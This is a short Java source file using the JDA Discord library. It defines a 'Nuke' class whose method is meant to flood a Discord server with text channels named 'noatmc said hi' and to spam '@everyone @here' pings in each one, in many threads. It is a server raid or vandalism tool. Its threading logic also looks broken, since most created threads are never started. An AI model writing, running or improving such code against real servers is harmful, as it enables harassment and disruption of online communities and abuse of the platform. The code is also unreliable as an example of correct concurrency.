package noatmc.said.hi.api.nuke;

import net.dv8tion.jda.api.entities.Guild;

public class Nuke {
    public static Thread everyone(Guild guild, int amount) {
        Thread thread = new Thread();
        while (true) {
            for (int i = 0; i<= 250; i++) {
                thread = new Thread(() -> {
                    guild.createTextChannel("noatmc said hi").queue((lol) -> {
                        for (int b = 0; b <=amount; b++) {
                            new Thread(() -> {
                                lol.sendMessage("@everyone @here - noatmc love ping").queue();
                            }).start();
                        }
                    });
                });
                thread.setDaemon(true);
            }
            break;
        }
        return thread;
    }
}
